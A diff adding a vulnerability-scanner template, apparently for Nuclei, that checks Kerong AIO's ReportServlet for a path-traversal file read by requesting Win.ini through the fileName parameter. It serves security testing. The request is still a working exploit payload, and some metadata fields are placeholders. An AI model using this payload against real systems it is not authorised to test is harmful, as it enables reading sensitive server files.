@@ -1,0 +1,18 @@
+id: kerongAIO-ReportServlet-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 科荣 AIO任意文件上传-目录遍历-任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E8%8D%A3%20AIO%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
